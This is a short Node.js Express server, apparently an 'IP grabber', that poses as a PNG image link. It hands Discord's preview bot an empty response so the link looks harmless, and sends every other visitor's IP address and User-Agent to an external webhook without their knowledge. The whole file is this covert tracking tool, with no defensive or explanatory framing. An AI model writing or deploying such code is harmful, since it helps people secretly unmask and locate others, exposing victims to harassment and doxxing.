const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;
const webhook = '';

app.all('*', (req, res) => {
  if (req.url.trim() === '/favicon.ico') return;

  const userAgent = req.get('User-Agent');
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  res.contentType('image/png');

  if (userAgent.includes('Discordbot')) {
    res.send('');
  } else {
    axios.post(webhook, {
      content: `UA: ${userAgent}\nIP: ${ip}`
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });
    res.send('');
  }
});

app.listen(port);
